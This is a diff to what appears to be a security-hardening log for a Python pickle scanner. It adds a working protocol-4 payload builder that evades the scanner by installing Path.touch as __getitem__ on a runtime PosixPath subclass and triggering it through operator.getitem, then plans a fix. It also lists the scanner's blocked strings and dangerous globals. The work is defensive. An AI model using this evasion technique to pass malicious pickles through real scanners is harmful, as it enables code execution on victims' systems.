@@ -4344,3 +4344,144 @@ Blocking plan:
 
 Performance note: five literals in the existing magic-method match arm, no
 rich-comparison flow modeling.
+
+## Turn 89 - Item read/delete method family gap
+
+Candidate payload:
+
+- Create a runtime subclass with `builtins.type`.
+- Use `pathlib.PosixPath` as the base class so instances are valid filesystem
+  paths.
+- Install `pathlib.Path.touch` as an item-protocol method, for example
+  `__getitem__`.
+- Instantiate the class with a marker path.
+- Call the matching clean `operator` helper, for example
+  `operator.getitem(instance, 0o666)`, during unpickling.
+
+Representative protocol 4 payload builder:
+
+```python
+from pathlib import Path
+
+
+def s(value: str) -> bytes:
+    data = value.encode()
+    if len(data) <= 0xFF:
+        return b"\x8c" + bytes([len(data)]) + data
+    return b"X" + len(data).to_bytes(4, "little") + data
+
+
+def text(value: str) -> bytes:
+    data = value.encode()
+    return b"U" + bytes([len(data)]) + data
+
+
+def sg(module: str, name: str) -> bytes:
+    return s(module) + s(name) + b"\x93"
+
+
+marker = Path("/tmp/ma_operator_getitem_dunder_getitem_marker")
+payload = b"".join(
+    [
+        b"\x80\x04",
+        sg("builtins", "type"),
+        b"(",
+        text("DerivedPath"),
+        sg("pathlib", "PosixPath"),
+        b"\x85",
+        b"}",
+        text("__getitem__"),
+        sg("pathlib", "Path.touch"),
+        b"s",
+        b"tR\x940",
+        b"h\x00",
+        text(str(marker)),
+        b"\x85R\x940",
+        sg("operator", "getitem"),
+        b"h\x01",
+        b"M" + (0o666).to_bytes(2, "little"),
+        b"\x86R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12 for the `__getitem__` representative:
+
+- Control scanner result: `len=153`, `status=complete`, `verdict=clean`,
+  `is_clean=True`, `findings=[]`, `notices=[]`
+- RCE scanner result: `len=178`, `status=complete`, `verdict=clean`,
+  `is_clean=True`, `findings=[]`, `notices=[]`
+- Coverage for the RCE payload: `bytes_scanned=178`, `bytes_total=178`,
+  `opcode_count=34`, `raw_scan_complete=True`, `opcode_scan_complete=True`
+- Scanner import references: `builtins.type`, `pathlib.PosixPath`,
+  `pathlib.Path.touch`, and `operator.getitem`, all with
+  `is_dangerous=False`
+- Control proof: the same pickle without the final `operator.getitem` call
+  returns a `DerivedPath` instance at
+  `/tmp/ma_operator_getitem_dunder_getitem_marker` and does not create the
+  marker
+- Unpickle result: the full payload creates
+  `/tmp/ma_operator_getitem_dunder_getitem_marker` and returns `None`
+
+Sibling slot proof:
+
+| Operator | Method | Scanner verdict | Runtime result |
+| --- | --- | --- | --- |
+| `operator.getitem` | `__getitem__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+| `operator.delitem` | `__delitem__` | clean, 0 findings, 0 notices | marker created, returns `None` |
+
+RCE mechanism:
+
+- `type(...)` builds a `pathlib.PosixPath` subclass with an attacker-controlled
+  item slot such as `__getitem__ = pathlib.Path.touch`.
+- The payload instantiates that subclass for the marker path.
+- `operator.getitem(instance, 0o666)` dispatches to
+  `instance.__getitem__(0o666)`.
+- Because `__getitem__` points at `Path.touch`, CPython calls
+  `Path.touch(instance, mode=0o666)`. The file is created before
+  `pickle.loads()` returns, and the visible result is just `None`.
+- The `operator.delitem` variant follows the same pattern with
+  `instance.__delitem__(0o666)`.
+
+Why the scanner missed it:
+
+- `__setitem__` is in the suspicious magic-method string list, but the
+  read/delete item-protocol slots `__getitem__` and `__delitem__` are not.
+- `operator.getitem` and `operator.delitem` are absent from
+  `DANGEROUS_GLOBALS`; current `operator` coverage includes `call`,
+  `attrgetter`, `itemgetter`, and `methodcaller`.
+- `builtins.type` and `pathlib.Path.touch` are clean; `pathlib` is not a
+  wildcard-dangerous module.
+- The dangerous callable is hidden as a synthesized item method, so the final
+  visible call target is a common item helper rather than the attacker-selected
+  callable.
+- The payload has no suspicious string seeds such as `eval(`, `exec(`,
+  `__import__`, `os.system`, `subprocess`, `__getattr__`,
+  `__getattribute__`, `__del__`, `__contains__`, `__setitem__`, or rich
+  comparison hooks.
+
+Performance note: the focused next block should add `__getitem__` and
+`__delitem__` to the suspicious magic-method string list. That keeps the hot
+path to two additional literals in the existing string policy and avoids
+item-protocol flow modeling.
+
+## Turn 90 - Block item read/delete seeds
+
+Blocking plan:
+
+- Add `__getitem__` and `__delitem__` to the existing suspicious magic-method
+  string list. Item read/delete hooks can route execution through item
+  protocol dispatch without an explicit dangerous call target.
+- Leave `operator.getitem`, `operator.delitem`, `builtins.type`,
+  `pathlib.PosixPath`, and `pathlib.Path.touch` allowed for this focused block.
+  The static signal is the attacker-controlled item-protocol slot name.
+- Add a CPython oracle regression that builds
+  `type(..., {"__getitem__": Path.touch})`-style payloads for both item
+  read/delete slots, verifies scan-time detection on both construction-only
+  controls and active `operator.*` RCE variants, proves the control instances
+  do not create markers, then proves each item operation creates its marker
+  during `pickle.loads()`.
+- Add a changelog entry under `[Unreleased]`.
+
+Performance note: two literals in the existing magic-method match arm, no
+item-protocol flow modeling.
